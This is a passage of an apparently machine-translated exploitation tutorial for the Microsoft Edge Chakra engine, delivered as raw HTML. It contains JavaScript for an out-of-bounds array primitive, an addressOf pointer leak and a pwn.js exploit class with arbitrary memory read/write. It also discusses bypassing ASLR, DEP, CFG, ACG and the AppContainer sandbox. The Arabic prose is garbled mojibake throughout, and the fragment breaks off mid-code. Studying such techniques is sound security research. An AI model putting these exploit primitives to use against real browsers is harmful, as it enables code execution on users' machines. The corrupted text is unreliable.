class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_set</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx, val</span></span></span><span class="hljs-function">) </span></span>{ target_arr[idx] = val; } <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>; i++) { arr_set(i, arr_get(i)); }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุฐูู ุ ุจุงุณุชุฎุฏุงู <code>arr_get</code> ู <code>arr_set</code> ููููู ุชุฌุงูุฒ ุญุฏูุฏ ุงููุตูููุฉ ( <code>OOB</code> ุ <code>out-of-bound</code> ). </p><br><h3 id="ispolzovanie-oob-dlya-polucheniya-primitiva-chteniya-i-zapisi-po-proizvolnomu-adresu" style=";text-align:right;direction:rtl">  ุงุณุชุฎุฏุงู <code>OOB</code> ููุญุตูู ุนูู ุจุฏุงุฆูุฉ ุงููุฑุงุกุฉ ูุงููุชุงุจุฉ ุฅูู ุนููุงู ุชุนุณูู </h3><br><p style=";text-align:right;direction:rtl">  ูู ูุฐุง ุงููุณู ุ ูุฃุฎุฐ ุจุนูู ุงูุงุนุชุจุงุฑ ุฃุณููุจูุง ูุชูุญ ูู ูุฑุงุกุฉ ุนููุงู ุชุนุณูู ูุงููุชุงุจุฉ ุฅููู ุจุงุณุชุฎุฏุงู <code>OOB</code> .  ุณุชููู ุงูุทุฑููุฉ ุงูุชู ูุญุตู ุนูููุง ุจูุฐุง ููุงุซูุฉ ููุทุฑููุฉ ุงููุณุชุฎุฏูุฉ ูู ุงููุตุฏุฑ [1] ุ ูููู ุณูููู ููุงู ุฃูุถูุง ุชุบููุฑุงุช ูุจูุฑุฉ. </p><br><p style=";text-align:right;direction:rtl">  ูู ุงูุฅุตุฏุงุฑ ุงููุณุชุฎุฏู ูู <code>Edge</code> ูุชู ุชุฎุตูุต ูุชู ุงูุฐุงูุฑุฉ ููููุงูุจ ุจุดูู ุชุณูุณูู ุ ูุฐูู ูุฃูู ุนูุฏ ุชุฎุตูุต ุนุฏุฏ ูุจูุฑ ูู ุฃู ูุงุฆูุงุช ุ ุณุชููู ุนุงุฌูุงู ุฃู ุขุฌูุงู ุจุนุฏ ุดุฑูุญุฉ ุงูุตููู ุ ูุงูุชู ูููููุง ุจุนุฏูุง ุงูุงูุชูุงู. </p><br><p style=";text-align:right;direction:rtl">  ุฃููุงู ุ ูููุญูุง ุงููุฏุฑุฉ ุนูู ูุฑุงุกุฉ ูุคุดุฑ ุฅูู ุฌุฏูู ุธุงูุฑู ูุฃุณุงููุจ ุงููุงุฆู ( <code>vftable</code> ) ุ ุญุชู ูุชููู ูู ุชุฌุงูุฒ ุงูุนุดูุงุฆูุฉ ููุณุงุญุฉ ุนููุงู ุงูุนูููุฉ ( <code>ASLR</code> ).  ูููู ุงููุตูู ุฅูู ุงูุฃุดูุงุก ุงูุชู ุณูู ุชุณุงุนุฏูุง ุนูู ุชุญููู ุงููุฑุงุกุฉ ูุงููุชุงุจุฉ ุงูุชุนุณููุ  ุฒูุฌุงู ูู ุงููุงุฆูุงุช <code>DataView</code> ูุจูุฑุฉ ููุฐุง ุงูุบุฑุถ. </p><br><blockquote style=";text-align:right;direction:rtl">  ูููุฑ DataView ูุงุฌูุฉ ููุฎูุถุฉ ุงููุณุชูู ููุฑุงุกุฉ ููุชุงุจุฉ ุฃููุงุน ุฑูููุฉ ูุชุนุฏุฏุฉ ูู ArrayBuffer ุซูุงุฆู ุ ุจุบุถ ุงููุธุฑ ุนู ุชุฑุชูุจ ุจุงูุช ุงููุธุงู ุงูุฃุณุงุณู. </blockquote><p style=";text-align:right;direction:rtl">  ูุญุชูู ุงููููู ุงูุฏุงุฎูู ูู <code>DataView</code> ุนูู ูุคุดุฑ ุฅูู ูุฎุฒู ูุคูุช.  ูููุฑุงุกุฉ ูุงููุชุงุจุฉ ุฅูู ุนููุงู ุนุดูุงุฆู ุ ุนูู ุณุจูู ุงููุซุงู ุ ูููููุง ุฅูุดุงุก ุณูุณูุฉ ูู <code>DataView</code> ( <code>dv1</code> ู <code>dv2</code> ) ุนูู ุงููุญู ุงูุชุงูู: ูุซู ุงููุฎุฒู ุงููุคูุช <code>dv1</code> ุญุฏุฏ ุงูุนููุงู <code>dv2</code> ุนู ุทุฑูู ุงููุตูู ุฅูู ุงูุตููู.  ุงูุขู ุจุงุณุชุฎุฏุงู <code>dv1</code> ูููููุง ุชุบููุฑ ุนููุงู ุงููุฎุฒู ุงููุคูุช <code>dv2</code> ุ ุจุณุจุจ ุชุญููู ุงููุฑุงุกุฉ ูุงููุชุงุจุฉ ุงูุชุนุณููุฉ.  ูู ุงููุงุญูุฉ ุงูุชุฎุทูุทูุฉ ุ ูููู ุชูุซูู ุฐูู ุนูู ุงููุญู ุงูุชุงูู: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ch/9n/do/ch9ndofe4zamumfvihnmv6xtg-o.jpeg" alt="ุนููุงู ุชุนุณูู ุงููุฑุงุกุฉ / ุงููุชุงุจุฉ"></p><br><p style=";text-align:right;direction:rtl">  ูุงุณุชุฎุฏุงู ูุฐู ุงูุทุฑููุฉ ุ ุชุญุชุงุฌ ุฅูู ูุนุฑูุฉ ููููุฉ ุชุญุฏูุฏ ุนูุงููู ุงููุงุฆูุงุช ูู ุงูุฐุงูุฑุฉ.  ููููุงู ุจุฐูู ุ ุชูุฌุฏ ุงูุชูููุฉ ุงูุชุงููุฉ: ุชุญุชุงุฌ ุฅูู ุฅูุดุงุก <code>Array</code> ุฌุฏูุฏ ุ ุงุณุชุฎุฏู <code>OOB</code> ูุญูุธ <code>vftable</code> ู <code>typeId</code> (ุฃูู ุญูููู 64 ุจุช ูู ุงูุจููุฉ) ูุชุนููู ุงููุงุฆู ุงูุฐู ููู ุงูุนููุงู ููุนูุตุฑ ุงูุฃูู ูู ุงูุตููู.  ุจุนุฏ ุฐูู ุ ูุฌุจ ุงุณุชุนุงุฏุฉ <code>typeId</code> ู <code>vftable</code> ุงููุญููุธุฉ ูุณุจููุง.  ุงูุขู ูููู ุงูุญุตูู ุนูู ุงููููุฉ ุงููุฒุฏูุฌุฉ ูุงููุจูุฑุฉ ูู ุนููุงู ุงููุงุฆู ุจุงูุฑุฌูุน ุฅูู ุงูุนูุตุฑ ุงูุฃูู ูุงูุซุงูู ูู ุงูุตููู.  ูุงูุญูููุฉ ูู ุฃู ุงููุตูููุฉ ุงูุฌุฏูุฏุฉ ูู <code>IntArray</code> ุ <code>IntArray</code> ุ ููุชู ุชุฎุฒูู ููู ุงููุตูููุฉ 4 ุจุงูุช ูู <code>IntArray</code> ููุง ูู.  ุนูุฏ ุชุนููู ูุงุฆู ุฅูู ุตููู ุ ูุชู ุชุญููู ุงูุตููู ุฅูู <code>ObjectArray</code> ุ ููุชู ุงุณุชุฎุฏุงู ุงูุฌุฒุก ุงูุฎุงุต ุจู ูุชุฎุฒูู ุนูุงููู ุงููุงุฆูุงุช.  ุงูุชุญููู ูุชุบูุฑ <code>vftable</code> ู <code>typeId</code> .  ููููุง ูุฐูู ุ ุฅุฐุง <code>vftable</code> ุงูููู ุงูุฃุตููุฉ <code>vftable</code> ู <code>typeId</code> ุ ูู ุฎูุงู ุนูุงุตุฑ ูุฐู ุงููุฌููุนุฉ ุ ูููููุง ุงููุตูู ุฅูู ุงูุดุฑูุญุฉ ูุจุงุดุฑุฉู.  ูููู ุชูุซูู ุงูุนูููุฉ ุงูููุตููุฉ ุชุฎุทูุทููุง ููุง ููู: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/un/np/-z/unnp-zlvr6ql9m5_f9rmxrdwt20.jpeg" alt="ุชุณุฑุจ ุงููุคุดุฑ"></p><br><p style=";text-align:right;direction:rtl">  ุณุชุจุฏู ูุธููุฉ ุงูุญุตูู ุนูู ุงูุนููุงู ููุง ููู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addressOf</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">obj</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> hdr_backup = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">4</span></span>); <span class="hljs-comment"><span class="hljs-comment">//  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) hdr_backup[i] = arr_get(intarr_idx + i); intarr_object[0] = obj; //  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) arr_set(intarr_idx + i, hdr_backup[i]); //         return [intarr_object[0], intarr_object[1]]; }</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุจูู ุงูุณุคุงู ุงูููุชูุญ ูู ุฅูุดุงุก ุงูุฃุดูุงุก ุงูุถุฑูุฑูุฉ ูุงูุจุญุซ ุนููุง ุจุงุณุชุฎุฏุงู <code>OOB</code> .  ููุง ุฐูุฑูุง ุณุงุจููุง ุ ุนูุฏ ุชุฎุตูุต ุนุฏุฏ ูุจูุฑ ูู ุงููุงุฆูุงุช ุ ุณุชุจุฏุฃ ุนุงุฌูุงู ุฃู ุขุฌูุงู ูู ุงูุธููุฑ ุจุนุฏ ุดุฑูุญุฉ ุงูุตููู ุ ูุงูุชู ูููููุง ุจุนุฏูุง ุงูุงูุชูุงู.  ููุนุซูุฑ ุนูู ุงููุงุฆูุงุช ุงูุถุฑูุฑูุฉ ุ ุชุญุชุงุฌ ููุท ุฅูู ุงุณุชุนุฑุงุถ ุงููุคุดุฑุงุช ุฎุงุฑุฌ ุงูุตููู ุจุญุซูุง ุนู ุงููุงุฆูุงุช ุงูุถุฑูุฑูุฉ.  ูุฃู  ุชูุฌุฏ ุฌููุน ุงููุงุฆูุงุช ูู ููุณ ุงูููุน ูู ุฌุฒุก ูุงุญุฏ ูู ุงููููุฉ ุ ูููููู ุชุญุณูู ุงูุจุญุซ <code>0x10000</code> ููุงุทุน ุงููููุฉ ูู ุงูุฒูุงุฏุงุช <code>0x10000</code> ุ ูุงูุชุญูู ูู ุงูููู ุงูููููุฉ ุงูุฃููู ููุท ูู ุจุฏุงูุฉ ูู ูุทุนุฉ ูู ุงููููุฉ.  ูุชุญุฏูุฏ ุงููุงุฆูุงุช ุ ููููู ุชุนููู ููู ูุฑูุฏุฉ ูุจุนุถ ุงููุนููุงุช (ุนูู ุณุจูู ุงููุซุงู ุ ุจุงููุณุจุฉ ูู <code>DataView</code> ุ ูููู ุฃู ูููู <code>byteOffset</code> ) ุ ุฃู ุจุงุณุชุฎุฏุงู ุงูุซูุงุจุช ุงููุนุฑููุฉ ุจุงููุนู ูู ุจููุฉ ุงููุงุฆู (ุนูู ุณุจูู ุงููุซุงู ุ ูู ุงูุฅุตุฏุงุฑ ุงููุณุชุฎุฏู ูู <code>Edge</code> ูู <code>IntArray</code> ุ ุชูุฌุฏ ุงููููุฉ <code>0x10005</code> ุฏุงุฆููุง ูู <code>0x18</code> ). </p><br><p style=";text-align:right;direction:rtl">  ูู ุฎูุงู ุงูุฌูุน ุจูู ุฌููุน ุงูุชูููุงุช ุงููุฐููุฑุฉ ุฃุนูุงู ุ ููููู ุงูุญุตูู ุนูู ุงููุฑุงุกุฉ ูุงููุชุงุจุฉ ุฅูู ุนููุงู ุชุนุณูู.  ููุฌุฏ ุฃุฏูุงู ููุทุฉ ูู ูุฑุงุกุฉ ูุงุฆูุงุช ุงูุฐุงูุฑุฉ <code>DataView</code> . </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/fe/i5/o3/fei5o3k0zh3pogdmb5diifeick8.png" alt="ุชุณุฑุจ ุงูุฐุงูุฑุฉ"></p><br><h2 id="shag-2-vypolnenie-proizvolnyh-funkciy-api" style=";text-align:right;direction:rtl">  ุงูุฎุทูุฉ 2. ุฃุฏุงุก ูุธุงุฆู API ุงูุชุนุณูู </h2><br><p style=";text-align:right;direction:rtl">  ูู ูุฐู ุงููุฑุญูุฉ ุ ุชูููุง ูู ูุฑุงุกุฉ ูุงููุชุงุจุฉ ุฅูู ุนููุงู ุนุดูุงุฆู ุฏุงุฎู ุนูููุฉ ุนุฑุถ ูุญุชูู <code>Edge</code> .  ุงููุธุฑ ูู ุงูุชูููุงุช ุงูุฑุฆูุณูุฉ ุงูุชู ููุจุบู ุฃู ุชุชุฏุงุฎู ูุน ูุฒูุฏ ูู ุงูุชุดุบูู ููุชุทุจูู ูุงูุญููู ุงูุฎุงุตุฉ ุจูู.  ููุฏ ุณุจู ุฃู ูุชุจูุง ุณูุณูุฉ ูุตูุฑุฉ ูู ุงูููุงูุงุช <code>  app specific security mitigation</code> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูุฌุฒุก 1 ุ ุงูููุฏูุฉ</a> ุ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูุฌุฒุก 2 ุ Internet Explorer ู Edge</a> ุ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูุฌุฒุก 3 ุ Google Chrome</a> ) ุ ูููู ุถุน ูู ุงุนุชุจุงุฑู ุฃู ุงููุทูุฑูู ูุง ููููุง ุตุงูุฏูู ููุถูููู ุฃุฏูุงุช ุฌุฏูุฏุฉ ุฅูู ููุชุฌุงุชูู ุงูุญูุงูุฉ. </p><br><h3 id="randomizaciya-adresnogo-prostranstva-aslr" style=";text-align:right;direction:rtl">  ุงูุนุดูุงุฆูุฉ ูุณุงุญุฉ ุงูุนููุงู ( <code>ASLR</code> ) </h3><br><blockquote style=";text-align:right;direction:rtl">  ASLR (ุงูุชูุฒูุน ุงูุนุดูุงุฆู ููุณุงุญุฉ ุงูุนููุงู ุจุงููุบุฉ ุงูุฅูุฌููุฒูุฉ) ูู ุชูููุฉ ูุณุชุฎุฏูุฉ ูู ุฃูุธูุฉ ุงูุชุดุบูู ูุงูุชู ุชุบูุฑ ูููุน ููุงูู ุงูุจูุงูุงุช ุงููููุฉ ุจุดูู ุนุดูุงุฆู ูู ูุณุงุญุฉ ุนููุงู ุงูุนูููุฉ ุ ููู: ุตูุฑ ุงููููุงุช ุงููุงุจูุฉ ููุชูููุฐ ุ ุงูููุชุจุงุช ุงููุญููุฉ ุ ุฃููุงู ุงูุฐุงูุฑุฉ ูููุฏุณ. </blockquote><p style=";text-align:right;direction:rtl">  ูู ุงูุฃุนูู ุ ุชุนูููุง ูุฑุงุกุฉ ุนูุงููู ุฌุฏุงูู ุงููุตูู ุงูุงูุชุฑุงุถูุฉ ุ ุจุงุณุชุฎุฏุงููุง ุ ูููููุง ุจุณูููุฉ ุญุณุงุจ ุงูุนููุงู ุงูุฃุณุงุณู <code>Chakra.dll</code> ุ ูุฐูู ูุง ููุซู <code>ASLR</code> ูุดุงูู ููุฒูุฏ ูู ุงูุชุดุบูู. </p><br><h3 id="data-execution-protection-dep-nx" style=";text-align:right;direction:rtl">  ุญูุงูุฉ ุชูููุฐ ุงูุจูุงูุงุช ( <code>DEP</code> ุ <code>NX</code> ) </h3><br><blockquote style=";text-align:right;direction:rtl">  Data Execution Prevention (DEP) ูู ููุฒุฉ ุฃูุงู ูุถููุฉ ูู Linux ู Mac OS X ู Android ู Windows ุชููุน ุชุทุจูู ูู ุชูููุฐ ุชุนูููุงุช ุจุฑูุฌูุฉ ูู ููุทูุฉ ุฐุงูุฑุฉ ุชุญูู ุนูุงูุฉ "ุจูุงูุงุช ููุท".  ุณุชููุน ุจุนุถ ุงููุฌูุงุช ุ ูุงูุชู ุ ุนูู ุณุจูู ุงููุซุงู ุ ุญูุธ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ูู ูุซู ูุฐู ุงูููุทูุฉ ุจุงุณุชุฎุฏุงู ุชุฌุงูุฒุงุช ุงููุฎุฒู ุงููุคูุช. </blockquote><p style=";text-align:right;direction:rtl">  ุทุฑููุฉ ูุงุญุฏุฉ ุญูู ูุฐู ุงูุญูุงูุฉ ูู ุงุณุชุฏุนุงุก <code>VirtualAlloc</code> ุจุงุณุชุฎุฏุงู ุณูุงุณู <code>ROP</code> .  ูููู ูู ุญุงูุฉ <code>Edge</code> ูู ุชูุฌุญ ูุฐู ุงูุทุฑููุฉ ุจุณุจุจ <code>ACG</code> (ุงูุธุฑ ุฃุฏูุงู). </p><br><h3 id="control-flow-guard-cfg" style=";text-align:right;direction:rtl">  ุงูุชุญูู ูู ุชุฏูู ุงูุญุฑุณ ( <code>CFG</code> ) </h3><br><blockquote style=";text-align:right;direction:rtl">  <code>CFG</code> ูู ุขููุฉ ุญูุงูุฉ ุชูุฏู ุฅูู ุชุนููุฏ ุนูููุฉ ุงุณุชุบูุงู ุงูุซุบุฑุงุช ุงูุฃูููุฉ ุงูุซูุงุฆูุฉ ูู ุชุทุจููุงุช ูุถุน ุงููุณุชุฎุฏู ูุงูููุงุฉ.  ูุชูุซู ุนูู ูุฐู ุงูุขููุฉ ูู ุงูุชุญูู ูู ุตุญุฉ ุงูููุงููุงุช ุบูุฑ ุงููุจุงุดุฑุฉ ุ ูุงูุชู ุชููุน ุงูููุงุฌู ูู ุงุนุชุฑุงุถ ุณูุณูุฉ ุนูููุงุช ุงูุชูููุฐ (ุนูู ุณุจูู ุงููุซุงู ุ ุนู ุทุฑูู ุงููุชุงุจุฉ ููู ุฌุฏูู ุงููุธุงุฆู ุงูุงูุชุฑุงุถูุฉ) </blockquote><p style=";text-align:right;direction:rtl">  ุชุชุญูู ูุฐู ุงูุชูููุฉ ูู ุงูููุงููุงุช ุบูุฑ ุงููุจุงุดุฑุฉ ููุท ุ ุนูู ุณุจูู ุงููุซุงู ุ ุงุณุชุฏุนุงุกุงุช ุงูุทุฑููุฉ ูู ุงูุฌุฏูู ุงูุธุงูุฑู ููุธุงุฆู ุงููุงุฆู.  ูุง ูุชู ุงูุชุญูู ูู ุนูุงููู ุงููุฑุชุฌุนุงุช ุงูููุฌูุฏุฉ ูู ุงููุฌููุนุฉ ุ ููููู ุงุณุชุฎุฏุงู ูุฐุง ูุฅูุดุงุก ุณูุงุณู <code>ROP</code> .  ูุฏ ูุนูู ุงูุงุณุชุฎุฏุงู ุงููุณุชูุจูู ูุณูุงุณู <code>ROP/JOP/COP</code> ุจูุงุณุทุฉ <code>Intel</code> ุงูุฌุฏูุฏุฉ: ุชูููุฉ <code>Control-flow Enforcement Technology</code> ( <code>CET</code> ).  ูุฐู ุงูุชูููููุฌูุง ุชุชููู ูู ุฌุฒุฃูู: </p><br><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  <code>Shadow Stack</code> (ููุฏุณ shadow) - ูุณุชุฎุฏู ููุชุญูู ูู ุนูุงููู ุงูุฅุฑุฌุงุน ููุญูู ูู ุณูุงุณู <code>ROP</code> ุ </li><li style=";text-align:right;direction:rtl">  <code>Indirect Branch Tracking</code> ูู ูุณููุฉ ููุญูุงูุฉ ุถุฏ ุณูุงุณู <code>JOP/COP</code> .  ุฅูู ุชุนูููุฉ <code>ENDBRANCH</code> ุฌุฏูุฏุฉ ุ ูุงูุชู <code>ENDBRANCH</code> ุฌููุน ุนูุงููู ุงูููู ุงูุตุงูุญุฉ ูุชุนูููุงุช <code>call</code> ู <code>jmp</code> . </li></ol><br><h3 id="arbitrary-code-guard-acg" style=";text-align:right;direction:rtl">  ุญุงุฑุณ ุฑูุฒ ุงูุชุนุณูู ( <code>ACG</code> ) </h3><br><blockquote style=";text-align:right;direction:rtl">  <code>ACG</code> ูู ุชูููุฉ ุชููุน ุฅูุดุงุก ุงูุดูุฑุฉ ุงูุฏููุงููููุฉ (ููููุน ุชุฎุตูุต ูุณุงุญุงุช ุงูุฐุงูุฑุฉ <code>rwx</code> ุจุงุณุชุฎุฏุงู <code>VirtaulAlloc</code> ) ูุชุนุฏููุงุชูุง (ูู ุงููุณุชุญูู <code>VirtaulAlloc</code> ููุทูุฉ ุงูุฐุงูุฑุฉ ุงููุชุงุญุฉ ููุชูููุฐ) </blockquote><p style=";text-align:right;direction:rtl">  ูุฐู ุงูุญูุงูุฉ ุ ูุซู <code>CFG</code> ุ ูุง ุชููุน ุงุณุชุฎุฏุงู ุณูุงุณู <code>ROP</code> . </p><br><h3 id="appcontainer-isolation" style=";text-align:right;direction:rtl">  AppContainer ุงูุนุฒูุฉ </h3><br><blockquote style=";text-align:right;direction:rtl">  AppContainer ูู ุฅุญุฏู ุชูููุงุช Microsoft ุงูุชู ุชุณูุญ ูู ุจุนุฒู ุงูุนูููุฉ ุนู ุทุฑูู ุชุดุบูููุง ูู ุจูุฆุฉ ูุถุน ุงูุญูุงูุฉ ูููุง.  ุชููุฏ ูุฐู ุงูุชูููุฉ ูุตูู ุงูุนูููุฉ ุฅูู ุจูุงูุงุช ุงูุงุนุชูุงุฏ ูุงูุฃุฌูุฒุฉ ููุธุงู ุงููููุงุช ูุงูุดุจูุฉ ูุงูุนูููุงุช ุงูุฃุฎุฑู ูุงูููุงูุฐ ูุชูุฏู ุฅูู ุชูููู ูุฏุฑุงุช ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุงูุชู ูุฏููุง ุงููุฏุฑุฉ ุนูู ุชูููุฐ ุชุนูููุงุช ุจุฑูุฌูุฉ ุนุดูุงุฆูุฉ ูู ุฃู ุนูููุฉ. </blockquote><p style=";text-align:right;direction:rtl">  ูุฐู ุงูุญูุงูุฉ ุชุนูุฏ ุนูููุฉ ุงูุนูููุฉ ุฅูู ุญุฏ ูุจูุฑ.  ุจุณุจุจ ุฐูู ุ ูุง ูููููุง ุงุณุชุฏุนุงุก ูููุงุช ูุงุจูุฉ ููุชูููุฐ ุชุงุจุนุฉ ูุฌูุฉ ุฎุงุฑุฌูุฉ ุฃู ุงููุตูู ุฅูู ูุนูููุงุช ุงููุณุชุฎุฏู ุงูุญุณุงุณุฉ ูู ุงูุฐุงูุฑุฉ ุฃู ุนูู ุงูุฃูุฑุงุต.  ููุน ุฐูู ุ ูููู ุงูุชุบูุจ ุนูู ูุฐู ุงูุญูุงูุฉ ูู ุฎูุงู ุงุณุชุฎุฏุงู ุงูุซุบุฑุงุช ุงูุฃูููุฉ ูู ุชุทุจูู ุฑูู AppContainer ุฃู ุนู ุทุฑูู ุฒูุงุฏุฉ ุงูุงูุชูุงุฒุงุช ูู ุฎูุงู ุงุณุชุบูุงู ุงูุซุบุฑุงุช ุงูุฃูููุฉ ูู ููุงุฉ ูุธุงู ุงูุชุดุบูู. </p><br><p style=";text-align:right;direction:rtl">  ุชุฌุฏุฑ ุงูุฅุดุงุฑุฉ ุฅูู ุฃู <code>Microsoft</code> ูุฏููุง <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุจุฑูุงูุฌ ููุงูุฃุฉ</a> ูููุตู ูุชูููุงุช ุงูุชุญุงูู ุนูู ุชูููุงุช <code>security mitigation</code> .  ูุดูุฑ ุงูุจุฑูุงูุฌ ุฅูู ุฃู ุฅุนุงุฏุฉ ุงุณุชุฎุฏุงู ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุงููุงุจูุฉ ููุชูููุฐ (ุจูุงุก ุณูุงุณู <code>ROP</code> ุชุนุฏ ุชููุนูุง ููุฐู ุงูุชูููุฉ) ูุง ุชูุฏุฑุฌ ุชุญุช ุงูุจุฑูุงูุฌ ุ ูุฃู  ูู ูุถูุฉ ุงููุนูุงุฑูุฉ. </p><br><h3 id="ispolzovanie-pwnjs" style=";text-align:right;direction:rtl">  ุจุงุณุชุฎุฏุงู pwn.js </h3><br><p style=";text-align:right;direction:rtl">  ูู ุชุญููู ุฌููุน ุชูููุงุช ุงูุฃูุงู ุ ูุชุจุน ุฐูู ููู ุชููู ูุงุฏุฑูุง ุนูู ุชูููุฐ ุชุนูููุงุช ุจุฑูุฌูุฉ ุนุดูุงุฆูุฉ ุ ุชุญุชุงุฌ ุฅูู ุชุฌุงูุฒ ุฑูู <code>AppContainer</code> .  ูู ูุฐู ุงูููุงูุฉ ุ ูุตู ุทุฑููุฉ ุชุณุชุฎุฏู ุซุบุฑุฉ ุฃูููุฉ ูู <code>Windows</code> kernel.  ูู ูุฐู ุงูุญุงูุฉ ุ ูููููุง ููุท ุงุณุชุฎุฏุงู ุณูุงุณู <code>JS</code> <code>ROP</code> .  ูุฏ ูููู ูู ุงูุตุนุจ ููุบุงูุฉ ูุชุงุจุฉ ุงุณุชุบูุงู ููููุงุฉ ุจุงุณุชุฎุฏุงู ุณูุงุณู <code>ROP</code> ููุท.  ูุชุจุณูุท ูุฐู ุงููููุฉ ุ ููููู ุงูุนุซูุฑ ุนูู ูุฌููุนุฉ ูู ุงูุฃุฏูุงุช ุงูุฐููุฉ ุงูุชู ูููููุง ูู ุฎูุงููุง ุงุณุชุฏุนุงุก ุฃุณุงููุจ <code>WinAPI</code> ุงูุถุฑูุฑูุฉ.  ูุญุณู ุงูุญุธ ุ ุชู ุชูููุฐ ุฐูู ุจุงููุนู ูู ููุชุจุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u="><code>pwn.js</code></a>  ุจุงุณุชุฎุฏุงูู ุ ุจุนุฏ ูุตู ูุธุงุฆู ุงููุฑุงุกุฉ ูุงููุชุงุจุฉ ููุท <code>read</code> <code>write</code> ุจุดูู ุชุนุณูู ุ ููููู ุงูุญุตูู ุนูู <code>API</code> ููุงุฆูุฉ ููุนุซูุฑ ุนูู ูุธุงุฆู <code>WinAPI</code> ุงูุถุฑูุฑูุฉ ูุงูุงุชุตุงู ุจูุง.  ูููุฑ <code>pwn.js</code> ุฃูุถูุง ุฃุฏุงุฉ ููุงุณุจุฉ ููุนูู ุจุงุณุชุฎุฏุงู ููู ููุคุดุฑุงุช ูุฃุฏูุงุช 64 ุจุช ููุนูู ูุน ุงูููุงูู. </p><br><p style=";text-align:right;direction:rtl">  ุงููุธุฑ ูู ูุซุงู ุจุณูุท.  ูู ุงูุฎุทูุฉ ุงูุณุงุจูุฉ ุ ุญุตููุง ุนูู ุณูุณูุฉ ูู ุงุซููู ูู <code>DataView</code> ุฐุงุช ุงูุตูุฉ.  ูุฅุนุฏุงุฏ ุงูุงุณุชุบูุงู ุ ูุฌุจ ุนููู ุฅูุดุงุก ุงููุตู ุงูุชุงูู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Exploit = (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ChakraExploit = pwnjs.ChakraExploit; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Integer = pwnjs.Integer; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Exploit</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ChakraExploit.call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); ... <span class="hljs-comment"><span class="hljs-comment">//  arbitrary address read/write    ... // DataView,         this.dv = ...; // DataView,     this.dv this.dv_offset = ...; //    Chakra.dll, ,     var vtable = ...; this.initChakra(vtable); } Exploit.prototype = Object.create(ChakraExploit.prototype); Exploit.prototype.constructor = Exploit; Exploit.prototype.set_dv_address = function(lo, hi) { this.dv_offset.setInt32(0x38, lo, true); this.dv_offset.setInt32(0x3c, hi, true); } Exploit.prototype.read = function (address, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: return new Integer(this.dv.getInt8(0, true), 0, true); case 16: return new Integer(this.dv.getInt16(0, true), 0, true); case 32: return new Integer(this.dv.getInt32(0, true), 0, true); case 64: return new Integer(this.dv.getInt32(0, true), this.dv.getInt32(4, true), true); } } Exploit.prototype.write = function (address, value, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: this.dv.setInt8(0, value.low, true); break; case 16: this.dv.setInt16(0, value.low, true); break; case 32: this.dv.setInt32(0, value.low, true); break; case 64: this.dv.setInt32(0, value.low, true); this.dv.setInt32(4, value.high, true); break; } } return Exploit; })();</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">     ,      <code>MessageBoxA</code> : </p><br><pre style=";text-align:right;direction:rtl"> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span 